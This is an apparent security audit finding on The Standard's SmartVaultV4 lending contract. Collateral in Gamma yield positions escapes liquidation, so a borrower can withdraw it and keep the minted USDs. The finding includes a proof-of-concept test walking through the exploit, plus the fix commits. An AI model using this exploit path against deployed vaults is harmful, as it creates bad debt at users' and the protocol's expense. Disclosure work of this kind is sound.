---
tags:
  - lang/solidity
  - platform/cyfrin
  - has/github
  - severity/high
  - sector/dex
  - sector/governance
  - sector/lending
  - sector/oracle
  - sector/stable
protocol: "[[The Standard Smart Vault]]"
auditors:
  - "[[immeas]]"
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-09-13-cyfrin-the-standard-smart-vault-v2.0.md"
genome:
  - "[[liquidation-logic]]"
  - "[[data-corruption/price-manipulation]]"
  - "[[chainlink-round-completeness]]"
  - "[[liquidation-underwater]]"
---
# USDs stability can be compromised as collateral deposited to Gamma vaults is not considered during liquidation

- id: 38333
- impact: HIGH
- protocol: [[The Standard Smart Vault]]
- reporter: Immeas (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2024-09-13-cyfrin-the-standard-smart-vault-v2.0.md

## Summary


The report describes a bug in The Standard platform where users can borrow a stablecoin called `USDs` using their deposited collateral in a `SmartVaultV4` instance. If the value of the collateral falls below 110% of the debt value, it can be liquidated. However, if the collateral is moved into a different type of vault called a Gamma Vault, it is not included in the liquidation process. This means that an attacker could repeatedly borrow against the collateral in a Gamma Vault after it has been liquidated, resulting in bad debt for the platform. The bug has been fixed by The Standard team in two separate commits.

## Details

**Description:** Users of The Standard can take out `USDs` stablecoin loans against their collateral deposited into an instance of `SmartVaultV4`. If the collateral value of a Smart Vault falls below 110% of the `USDs` debt value, it can be liquidated in full. Users can also move collateral tokens into Gamma Vaults (aka Hypervisors) that hold LP positions in Uniswap V3 to earn an additional yield on their deposited collateral.

Collateral held as yield positions in Gamma Vaults are represented by Hypervisor tokens transferred to and held by the `SmartVaultV4` contract; however, these tokens are not affected by liquidation:

```solidity
function liquidate() external onlyVaultManager {
    if (!undercollateralised()) revert NotUndercollateralised();
    liquidated = true;
    minted = 0;
    liquidateNative();
    ITokenManager.Token[] memory tokens = ITokenManager(ISmartVaultManagerV3(manager).tokenManager()).getAcceptedTokens();
    for (uint256 i = 0; i < tokens.length; i++) {
        if (tokens[i].symbol != NATIVE) liquidateERC20(IERC20(tokens[i].addr));
    }
}
```

Currently, Hypervisor tokens present in the `SmartVaultV4::hypervisors` array are not included in the array returned by `TokenManager::getAcceptedTokens` as this would require them to have a Chainlink data feed. Therefore, any collateral deposited as a yield position within a Gamma Vault will remain unaffected.

A user could reasonably have a Smart Vault with 100% of their collateral deposited to Gamma, with 100% of the maximum USDs minted. At this point, any small market fluctuation would leave the Smart Vault undercollateralised and susceptible to liquidation. Given that the `minted` state variable is reset to zero upon successful liquidation, the user is again able to access this collateral via [`SmartVaultV4::removeCollateral`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L186) due to the validation in [`SmartVaultV4::canRemoveCollateral`](https://github.com/the-standard/smart-vault/blob/c6837d4a296fe8a6e4bb5e0280a66d6eb8a40361/contracts/SmartVaultV4.sol#L171):

```solidity
function canRemoveCollateral(ITokenManager.Token memory _token, uint256 _amount) private view returns (bool) {
    if (minted == 0) return true;
    /* snip: collateral calculations */
}
```

Consequently, the user can withdraw the collateral without repaying the original `USDs` loan. Given the `liquidated` state variable would now be set to `true`, any attacker would need to create a new Smart Vault before the collateral could be used again.

**Impact:** An attacker could repeatedly borrow against collateral deposited in a yield position after being liquidated, resulting in bad debt for the protocol and likely compromising the stability of `USDs` if executed on a large scale.

**Proof of Concept:** The following test can be added to `SmartVault.js`:
```javascript
it('cant liquidate yield positions', async () => {
  const ethCollateral = ethers.utils.parseEther('0.1')
  await user.sendTransaction({ to: Vault.address, value: ethCollateral });

  let { collateral, totalCollateralValue } = await Vault.status();
  let preYieldCollateral = totalCollateralValue;
  expect(getCollateralOf('ETH', collateral).amount).to.equal(ethCollateral);

  depositYield = Vault.connect(user).depositYield(ETH, HUNDRED_PC.div(10));
  await expect(depositYield).not.to.be.reverted;
  await expect(depositYield).to.emit(YieldManager, 'Deposit').withArgs(Vault.address, MockWeth.address, ethCollateral, HUNDRED_PC.div(10));

  ({ collateral, totalCollateralValue } = await Vault.status());
  expect(getCollateralOf('ETH', collateral).amount).to.equal(0);
  expect(totalCollateralValue).to.equal(preYieldCollateral);

  const mintedValue = ethers.utils.parseEther('100');
  await Vault.connect(user).mint(user.address, mintedValue);

  await expect(VaultManager.connect(protocol).liquidateVault(1)).to.be.revertedWith('vault-not-undercollateralised')

  // drop price, now vault is liquidatable
  await CL_WBTC_USD.setPrice(1000);

  await expect(VaultManager.connect(protocol).liquidateVault(1)).not.to.be.reverted;
  ({ minted, maxMintable, totalCollateralValue, collateral, liquidated } = await Vault.status());

  // hypervisor tokens (yield position) not liquidated
  await expect(MockWETHWBTCHypervisor.balanceOf(Vault.address)).to.not.equal(0);

  // since minted is zero, the vault owner still has access to all collateral
  expect(minted).to.equal(0);
  expect(maxMintable).to.not.equal(0);
  expect(totalCollateralValue).to.not.equal(0);
  collateral.forEach(asset => expect(asset.amount).to.equal(0));
  expect(liquidated).to.equal(true);

  // price returns
  await CL_WBTC_USD.setPrice(DEFAULT_ETH_USD_PRICE.mul(20));

  // user exits yield position
  await Vault.connect(user).withdrawYield(MockWETHWBTCHypervisor.address, ETH);
  await Vault.connect(user).withdrawYield(MockUSDsHypervisor.address, ETH);

  // and withdraws assets
  const userBefore = await ethers.provider.getBalance(user.address);
  await Vault.connect(user).removeCollateralNative(await ethers.provider.getBalance(Vault.address), user.address);
  const userAfter = await ethers.provider.getBalance(user.address);

  // user should have all collateral back minus protocol fee from yield withdrawal
  expect(userAfter.sub(userBefore)).to.be.closeTo(ethCollateral, ethers.utils.parseEther('0.01'));

  // and user also has the minted USDs
  const usds = await USDs.balanceOf(user.address);
  expect(usds).to.equal(mintedValue);
});
```

**Recommended Mitigation:** Ensure that collateral held in yield positions is also subject to liquidation.

**The Standard DAO:** Fixed by commit [`c6af5d2`](https://github.com/the-standard/smart-vault/commit/c6af5d21fc20244531c0202b70eb9392a6ea9b6a).

**Cyfrin:** Verified, `SmartVault4::liquidate` now also loops over the `SmartVaultV4::hypervisors` array. However, native liquidation should be performed last to mitigate re-entrancy risk. Similarly, revocation of roles in `SmartVaultManagerV6::liquidateVault` should occur before invoking `SmartVaultV4::liquidate`.

**The Standard DAO:** Fixed by commit [`23c573c`](https://github.com/the-standard/smart-vault/commit/23c573cba241b0dc6af276f56ee8772efc8b4a5c).

**Cyfrin:** Verified, the order of calls had been modified.
